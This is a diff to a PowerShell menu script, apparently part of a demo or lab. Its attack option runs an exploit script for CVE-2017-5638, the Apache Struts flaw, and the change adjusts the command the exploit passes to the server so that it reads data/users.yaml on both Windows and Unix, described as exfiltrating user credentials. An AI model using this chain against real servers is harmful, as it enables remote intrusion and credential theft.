@@ -18,7 +18,11 @@ While ($true) {
         }
         'a' {
             Write-Host "Running attack script - exfiltrating user credentials...`n"
-            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -Command "cat data/users.yaml"
+            # Use the OS-native read command so the JVM shell can execute it.
+            #   Windows cmd.exe uses 'type' with backslash paths.
+            #   Linux/macOS sh uses 'cat' with forward-slash paths.
+            $readCmd = if ($IsWindows) { 'type data\users.yaml' } else { 'cat data/users.yaml' }
+            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -Command $readCmd
         }
         'd' {
             Write-Host "`n=== DIAGNOSTIC: Running levels 1-6 ===" -ForegroundColor Magenta
